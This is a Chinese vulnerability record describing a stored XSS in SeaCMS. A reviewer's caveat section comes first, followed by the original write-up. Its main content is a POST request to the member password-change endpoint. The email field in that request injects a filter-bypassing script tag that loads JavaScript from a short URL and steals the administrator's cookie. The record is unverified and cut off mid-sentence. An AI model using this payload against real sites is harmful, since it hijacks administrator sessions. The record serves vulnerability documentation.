---
source: "hatch 补库批 20260928"
product: "SeaCMS version unspecified"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Seacms 储存型xss"
prerequisites: "来源所述条件，未列明部分仍待核：会员知旧密码修改邮箱；系统管理员查看用户页；外部JS可加载/非HttpOnlyCookie"
side_effects: "未执行；本文需注意的操作影响：scbase64ript绕过需服务器删除base64的过滤证据；短URL目的地址无法从文内核验，不应保留不透明外带"
source_status: "unknown"
id: "vw-53cc223cba129ac0dd382c2a"
entity_id: "ve-53cc223cba129ac0dd382c2a"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：会员知旧密码修改邮箱；系统管理员查看用户页；外部JS可加载/非HttpOnlyCookie

- **代码与转录边界（1）**：结尾普通管理处截断且说两点只给第一点。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **操作与副作用边界（2）**：scbase64ript绕过需服务器删除base64的过滤证据；短URL目的地址无法从文内核验，不应保留不透明外带。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **凭据与会话边界（3）**：完整请求缺Cookie/版本/响应；只有系统管理员可见是关键角色限制。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Seacms 储存型xss

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    POST /member.php?action=chgpwdsubmit

    oldpwd=test&newpwd=test&newpwd2=test&email=test%40test.com<scbase64ript src=https://url.cn/585l00F></scrbase64ipt>&nickname=&gaimi=%E7%A1%AE%E8%AE%A4%E4%BF%AE%E6%94%B9

### src的值为[http://127.0.0.1/test.js的短链接](http://127.0.0.1/test.js的短链接)

当后台浏览到后台界面时，会触发漏洞，反弹回来Cookie，但需要注意两点，第一，只有系统管理员才能看到用户界面，普通管理
